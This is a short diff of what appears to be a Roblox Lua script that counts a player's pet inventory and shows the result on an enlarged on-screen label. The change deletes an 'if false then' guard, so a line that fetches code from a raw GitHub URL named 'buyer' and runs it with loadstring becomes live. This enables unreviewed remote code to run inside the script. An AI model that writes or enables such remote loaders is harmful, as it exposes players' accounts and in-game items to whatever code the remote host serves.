@@ -395,7 +395,6 @@ local Ps = {}
 local a = 0
 local b = 0
 local count111 = 0
-if false then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/qweaad1/qwe/main/buyer"))()
 for i, v in pairs(require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.pets) do
   count111 = count111+1
@@ -566,7 +565,7 @@ end
 updateLabel(tostring(a))
   wait(120)
     end
-end
+
 
 
 label.FontSize = Enum.FontSize.Size70 -- Увеличиваем размер шрифта в 4 раза
